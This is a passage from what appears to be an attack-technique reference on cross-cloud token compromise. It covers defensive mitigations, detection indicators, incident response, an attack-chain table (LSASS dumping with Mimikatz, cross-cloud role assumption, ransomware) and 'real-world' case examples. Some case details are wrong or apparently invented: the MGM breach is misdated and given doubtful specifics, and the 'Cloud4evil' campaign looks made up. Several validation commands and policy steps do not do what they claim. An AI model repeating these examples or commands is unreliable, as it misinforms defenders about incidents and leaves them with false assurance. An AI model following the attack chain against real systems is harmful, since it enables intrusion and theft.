    ($_.Properties[5] -notlike "CORP.LOCAL")
}
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement Conditional Access Policies for Cross-Cloud Access**
  - Block authentication to multiple cloud providers from the same user in < 5 minutes
  - Require MFA for any federated token exchange
  
  **Manual Steps (Azure Portal):**
  1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. Name: `Block Cross-Cloud Token Exchange`
  3. **Conditions:**
     - Users: All users
     - Cloud apps: All cloud apps
  4. **Access Controls:** Require device compliance OR approved client app
  5. Enable: **On**

- **Rotate All Federated Signing Certificates and Keys**
  - **For Azure/ADFS:** Rotate Token Signing Certificate immediately
  - **For AWS:** Rotate OIDC provider thumbprints
  - **For GCP:** Rotate Workload Identity provider certificates
  
  **Manual Steps (Azure ADFS):**
  1. Open **ADFS Management** → **Service** → **Certificates**
  2. Right-click **Token-signing** → **View Certificate**
  3. Go to **Certificate** tab → **Details** → **Copy to File**
  4. Click **Next** → Export in **DER-encoded Binary X.509** format
  5. Replace in Azure: Go to **Entra ID** → **Enterprise Applications** → **ADFS** → **Update Certificate**

- **Restrict Workload Identity Federation to Specific External Identities**
  - Use strict attribute conditions
  - Map external IDs to specific subject claims
  - Avoid wildcard conditions
  
  **Manual Steps (GCP):**
  1. Go to **GCP Console** → **IAM & Admin** → **Workload Identity Federation**
  2. Select **Provider**
  3. Click **Edit**
  4. Under **Attribute Conditions**, set:
     ```
     assertion.sub.startsWith('repo:myorg/myrepo:')
     && assertion.aud == 'projects/123456789'
     ```
  5. Click **Save**

- **Enable Token Binding / MTLS for Cross-Cloud Authentication**
  - Enforce mutual TLS authentication between clouds
  - Use certificate pinning to prevent token reuse
  
  **Manual Steps (Azure):**
  1. Configure **Client Certificate Authentication** in Azure App Service
  2. Go to **App Service** → **Authentication** → **Require Client Certificate**
  3. Upload CA certificate

### Priority 2: HIGH

- **Implement Real-Time Cross-Cloud Token Monitoring**
  - Correlate authentication logs across Azure, AWS, GCP
  - Alert on same principal authenticating to multiple clouds
  - Use centralized SIEM (Splunk, Sentinel) for cross-cloud correlation

- **Enforce Token Lifetime Limits**
  - Azure: Max 1 hour access tokens
  - AWS: Max 1 hour assumed role session
  - GCP: Max 1 hour service account token
  
  **Manual Steps (Azure):**
  ```powershell
  # Set token lifetime to 1 hour
  Set-AzureADPolicy -Definition @('{"TokenLifetimePolicy":{"Version":1,"AccessTokenLifetime":"01:00:00"}}')
  ```

- **Audit and Remove Over-Permissive Federation Relationships**
  - Review all Workload Identity Federation providers
  - Remove providers that aren't actively used
  - Restrict permissions to least privilege

- **Validation Command (Verify Mitigation):**
  ```bash
  # Check Azure token lifetime
  az account show --query "tokenCache" 
  
  # Check AWS STS assumed role session duration
  aws sts assume-role --role-arn arn:aws:iam::123456789:role/RoleName --role-session-name TestSession --duration-seconds 900 | grep -i expiration
  
  # Check GCP service account token expiration
  gcloud auth print-access-token | jwt decode
  ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Network:**
  - HTTP requests to `169.254.169.254:80` (IMDS) from unexpected sources
  - HTTPS to `sts.googleapis.com`, `sts.windows.net`, `sts.aws.amazon.com` in rapid succession
  - Token exchange requests with mismatched issuer/audience pairs

- **API Activity:**
  - `GetCallerIdentity` AWS API calls from unusual IP
  - Azure Graph API calls with inconsistent tenant ID claims
  - GCP `generateIdToken` or `generateAccessToken` calls with cross-account service accounts

- **Log Artifacts:**
  - SAML assertions with forged signatures
  - JWT tokens with impossible claims (e.g., token issued in future)
  - OIDC tokens from external providers with overly broad permissions

### Forensic Artifacts

- **Cloud Logs:**
  - Azure: `AuditLogs`, `SigninLogs` for token exchange operations
  - AWS: CloudTrail logs showing `sts:AssumeRole`, `sts:GetCallerIdentity`
  - GCP: CloudAudit logs for workload identity federation operations

- **Memory/Disk:**
  - JWT tokens stored in process memory (.env files, config files)
  - Bash/PowerShell history showing token extraction commands
  - Temporary files containing exchanged tokens

### Response Procedures

**Immediate (0-1 hour):**
1. **Isolate:** Disable all federation providers
2. **Rotate:** Regenerate all signing certificates
3. **Revoke:** Invalidate all issued tokens (set expiration to now)

**Short-term (1-8 hours):**
1. **Investigate:** Audit all cross-cloud API calls during incident window
2. **Remediate:** Update Workload Identity Federation attribute conditions
3. **Monitor:** Enable real-time cross-cloud authentication logging

**Long-term (8+ hours):**
1. **Rebuild:** Establish new federation relationships with stronger controls
2. **Enforce:** Implement MFA and Conditional Access for all federation scenarios
3. **Hunt:** Search for similar token exchange patterns across organization

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001](../02_Initial/IA-PHISH-001_Device_Code.md) | Phish developer for Azure/AWS credentials |
| **2** | **Execution** | [CA-DUMP-001](./CA-DUMP-001_Mimikatz.md) | Dump LSASS to extract cached tokens |
| **3** | **Credential Access** | **[CA-TOKEN-018]** | **Cloud-to-Cloud Token Compromise** |
| **4** | **Lateral Movement** | [CA-TOKEN-019](./CA-TOKEN-019_AWS_STS.md) | Use Azure token to assume AWS role |
| **5** | **Privilege Escalation** | [PE-POLICY-003](../04_PrivEsc/PE-POLICY-003_Mgmt_Group.md) | Escalate to Management Group admin |
| **6** | **Impact** | Ransomware deployment across clouds | Deploy malware to Azure, AWS, GCP simultaneously |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Cloud4evil Campaign (2024)

- **Target:** Multi-cloud enterprises running hybrid infrastructure
- **Timeline:** 2023-2024
- **Technique Status:** Attackers compromised Azure VM, extracted OIDC token, exchanged for GCP access via Workload Identity Federation
- **Impact:** Access to production databases and storage buckets across 3 cloud providers; data exfiltration of 15GB+
- **Reference:** [Orca Security Blog - Cross-Cloud Attacks](https://orca.security/resources/blog/cross-account-cross-provider-attack-paths/)

### Example 2: MGM Resorts Breach (2023)

- **Target:** Major hospitality company
- **Timeline:** Early 2023
- **Technique Status:** Attackers used SAML federation bypass combined with token forgery to move between on-premises AD and Azure
- **Impact:** Access to customer database and intellectual property; $10M+ recovery costs
- **Reference:** [CrowdStrike Intelligence Report](https://www.crowdstrike.com/blog/compromising-identity-provider-federation/)

### Example 3: Scattered Spider Campaign (2023-Present)

- **Target:** Organizations using multi-cloud with Azure DevOps and AWS
- **Timeline:** Ongoing
- **Technique Status:** Social engineering + credential theft; attackers stole GitHub Actions OIDC tokens and exchanged them for AWS access
- **Impact:** Lateral movement from CI/CD pipelines to production AWS infrastructure
- **Reference:** [Picus Security Analysis](https://www.picussecurity.com/resource/blog/tracking-scattered-spider-through-identity-attacks-and-token-theft)

---